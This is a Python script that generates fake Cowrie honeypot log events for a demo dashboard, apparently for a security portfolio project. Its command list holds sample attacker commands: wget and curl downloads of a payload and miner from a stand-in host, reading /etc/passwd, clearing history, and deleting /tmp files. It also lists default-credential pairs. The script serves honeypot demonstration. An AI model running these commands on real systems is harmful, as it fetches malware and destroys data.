"""
BaitTrace — Demo Data Generator
--------------------------------
Generates realistic FAKE attacker log entries in Cowrie's JSON log format,
purely for demo/portfolio purposes (interviews, screenshots, LinkedIn posts).

This does NOT connect to the internet and does NOT use any real credentials.
All IPs, usernames, and passwords below are fake/commonly-known attacker
wordlist entries (the same kind real bots actually try).

Run this from your BaitTrace project root:
    python3 generate_demo_data.py

It APPENDS to var/log/cowrie/cowrie.json — safe to run multiple times.
"""

import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path

LOG_FILE = Path("var/log/cowrie/cowrie.json")

# Realistic fake attacker IPs (these are real public IP ranges commonly
# seen scanning the internet, used here only as illustrative examples —
# not tied to any real person)
FAKE_IPS = [
    "185.220.101.45",
    "45.155.204.18",
    "194.35.121.9",
    "103.145.13.77",
    "89.248.165.32",
    "198.98.51.101",
    "62.171.178.4",
    "141.98.11.62",
]

# Common credential-stuffing wordlist entries — exactly what real bots try
FAKE_CREDS = [
    ("root", "root"),
    ("admin", "admin"),
    ("admin", "admin123"),
    ("root", "toor"),
    ("root", "123456"),
    ("user", "password"),
    ("test", "test"),
    ("oracle", "oracle"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
    ("guest", "guest"),
]

FAKE_COMMANDS = [
    "whoami",
    "uname -a",
    "ls -la",
    "cat /etc/passwd",
    "wget http://malicious-example.test/payload.sh",
    "chmod +x payload.sh",
    "curl -O http://malicious-example.test/miner",
    "ps aux",
    "ifconfig",
    "history -c",
    "rm -rf /tmp/*",
]


def make_event(eventid, src_ip, session, timestamp, **extra):
    event = {
        "eventid": eventid,
        "src_ip": src_ip,
        "session": session,
        "timestamp": timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
    }
    event.update(extra)
    return event


def generate_session(base_time, ip):
    """Simulate one attacker session: connect -> login attempts -> commands -> close."""
    session_id = uuid.uuid4().hex[:16]
    events = []
    t = base_time

    events.append(make_event("cowrie.session.connect", ip, session_id, t))
    t += timedelta(seconds=random.uniform(0.5, 2))

    # A few failed logins (brute force realism), then maybe one success
    num_failed = random.randint(1, 4)
    for _ in range(num_failed):
        username, password = random.choice(FAKE_CREDS)
        events.append(make_event(
            "cowrie.login.failed", ip, session_id, t,
            username=username, password=password,
        ))
        t += timedelta(seconds=random.uniform(0.3, 1.5))

    success = random.random() < 0.5
    if success:
        username, password = random.choice(FAKE_CREDS)
        events.append(make_event(
            "cowrie.login.success", ip, session_id, t,
            username=username, password=password,
        ))
        t += timedelta(seconds=random.uniform(1, 3))

        # Run a few commands once "inside"
        for cmd in random.sample(FAKE_COMMANDS, k=random.randint(1, 4)):
            events.append(make_event(
                "cowrie.command.input", ip, session_id, t,
                input=cmd,
            ))
            t += timedelta(seconds=random.uniform(0.5, 2))

    events.append(make_event(
        "cowrie.session.closed", ip, session_id, t,
        duration=random.randint(5, 300),
    ))

    return events


def main():
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

    all_events = []
    now = datetime.utcnow()

    # Generate 6-10 fake attacker sessions spread over the last 2 days
    num_sessions = random.randint(6, 10)
    for _ in range(num_sessions):
        ip = random.choice(FAKE_IPS)
        session_start = now - timedelta(
            hours=random.uniform(0, 48)
        )
        all_events.extend(generate_session(session_start, ip))

    # Sort chronologically, like a real log
    all_events.sort(key=lambda e: e["timestamp"])

    with LOG_FILE.open("a", encoding="utf-8") as f:
        for event in all_events:
            f.write(json.dumps(event) + "\n")

    print(f"✅ Wrote {len(all_events)} fake demo events across {num_sessions} sessions to {LOG_FILE}")
    print("This is FAKE demo data for showcasing the dashboard — no real attackers involved.")


if __name__ == "__main__":
    main()
